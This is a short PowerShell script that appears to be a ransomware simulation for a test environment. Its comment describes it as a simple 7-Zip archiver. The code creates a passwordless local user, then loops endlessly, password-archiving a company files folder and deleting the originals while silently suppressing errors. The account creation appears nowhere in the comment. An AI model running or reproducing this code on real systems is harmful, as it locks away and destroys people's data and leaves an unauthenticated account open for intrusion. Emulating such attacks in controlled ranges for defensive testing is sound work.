#*********************************************************************************
#This program accesses the 7zip file path, takes $Source file and archives
#it and password protects into $Target file. $Source file is then deleted.
#$password comes from topotest guestinfo file.
#*********************************************************************************

$username = "##username##"; New-LocalUser "$username" -NoPassword; while($True){$env:password = "##encryptionpwd##"; $7zipPath = "$env:ProgramFiles\7-Zip\7z.exe" ; Set-Alias 7zip $7zipPath ; $Source = "C:\Users\Public\CompanyFiles" ; $Target = "C:\Users\Public\CompanyFiles.zip" ; if  (test-path -path $Source) { Invoke-Expression "7zip a -mx=9 $Target $Source -p"##encryptionpwd##" -sdel" -ErrorAction SilentlyContinue } else {Write-host "Skipping"} ; Start-Sleep 10 }
